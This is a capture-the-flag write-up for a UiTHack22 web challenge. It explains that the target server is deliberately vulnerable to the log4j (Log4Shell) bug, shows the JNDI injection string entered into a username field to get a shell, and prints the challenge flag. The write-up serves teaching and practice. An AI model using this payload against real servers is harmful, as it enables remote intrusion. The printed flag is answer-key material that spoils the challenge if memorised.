> # The Logs Are Flawed
> > Web - 500pts
>
> The Galactic empire have found a flaw in an old piece of software that they think the rebel alliance is using.  
> This flaw affects the logging application used on one of their secret servers.  
> You and the rest of the empire digital attack force are tasked with using the bug to extract secret information from the server found at (link).
> 
> ![hacker](https://68.media.tumblr.com/f34726c691d11ac56adcdc21f0f38a4c/tumblr_omsi8eaput1so18vqo1_540.gif)

# Writeup

The server is intentionally vulnerable to the recently discovered log4j bug.  
This can be exploited to enter a shell on the server and print the file /flag.txt inside the docker container.  
The vulnerable server is a slightly modified version of https://github.com/kozmer/log4j-shell-poc.   
Use their proof of concept application to enter '${jndi:ldap://localhost:1389/a}' into the username field and forward to a shell application.  
Use this shell to read the flag.txt file from either / or /usr/local/tomcat.

flag: 
```
UiTHack22{There_Are_Bugs_In_The_LoGs}
```
